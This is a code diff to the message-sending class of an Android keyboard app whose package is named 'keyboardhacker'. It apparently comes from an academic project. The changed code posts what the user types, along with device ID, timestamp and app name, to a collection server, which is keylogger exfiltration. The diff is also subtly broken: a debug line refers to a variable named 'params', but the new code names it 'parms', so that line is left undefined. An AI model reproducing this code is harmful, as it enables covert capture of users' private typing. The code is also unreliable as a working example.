@@ -1,6 +1,7 @@
 package edu.cmu.keyboardhacker.simplekeyboard;
 
 import android.os.AsyncTask;
+import android.os.SystemClock;
 
 import org.json.JSONObject;
 
@@ -8,6 +9,7 @@ import java.io.BufferedOutputStream;
 import java.io.OutputStream;
 import java.net.HttpURLConnection;
 import java.net.URL;
+import java.net.URLEncoder;
 
 /**
  * Created by helunwen on 11/23/16.
@@ -22,7 +24,7 @@ public class MessagService extends AsyncTask<Void, Void, Void> {
 
     private String applicaitonName;
 
-    private String url = "http://localhost:8080/api/messages/add";
+    private String url = "http://10.0.2.2:8080/api/messages/add";
 
     private HttpURLConnection httpURLConnection;
 
@@ -38,21 +40,23 @@ public class MessagService extends AsyncTask<Void, Void, Void> {
         try {
             URL url = new URL(this.url);
             this.httpURLConnection = (HttpURLConnection) url.openConnection();
+            this.httpURLConnection.setDoOutput(true);
+            this.httpURLConnection.setChunkedStreamingMode(0);
             this.httpURLConnection.setRequestMethod("POST");
-            this.httpURLConnection.addRequestProperty("async", "true");
-            this.httpURLConnection.addRequestProperty("crossDomain", "true");
-            this.httpURLConnection.addRequestProperty("content-type", "application/x-www-form-urlencoded");
-            this.httpURLConnection.addRequestProperty("cache-control", "no-cache");
-            JSONObject jsonObjectData = new JSONObject();
-            jsonObjectData.put("deviceId", this.deviceId);
-            jsonObjectData.put("messageTime", this.timestamp);
-            jsonObjectData.put("content", this.message);
-            jsonObjectData.put("appName", this.applicaitonName);
-            JSONObject parms = new JSONObject();
-            parms.put("data", jsonObjectData);
+            this.httpURLConnection.setRequestProperty("async", "true");
+            this.httpURLConnection.setRequestProperty("crossDomain", "true");
+            this.httpURLConnection.setRequestProperty("content-type", "application/x-www-form-urlencoded");
+            this.httpURLConnection.setRequestProperty("cache-control", "no-cache");
+            String parms = String.format("deviceId=%s&messageTime=%s&content=%s&appName=%s",
+                    URLEncoder.encode(this.deviceId, "UTF-8"),
+                    URLEncoder.encode(this.timestamp, "UTF-8"),
+                    URLEncoder.encode(this.message, "UTF-8"),
+                    URLEncoder.encode(this.applicaitonName, "UTF-8"));
             OutputStream output = new BufferedOutputStream(this.httpURLConnection.getOutputStream());
-            output.write(params.toString().getBytes());
+            output.write(parms.toString().getBytes());
             output.flush();
+            System.out.println(String.format("Message sent: %s\n", params));
+            System.out.println(String.format("Respond code %d, response message %s\n", this.httpURLConnection.getResponseCode(), this.httpURLConnection.getResponseMessage()));
         } catch (Exception e) {
             e.printStackTrace();
         } finally {
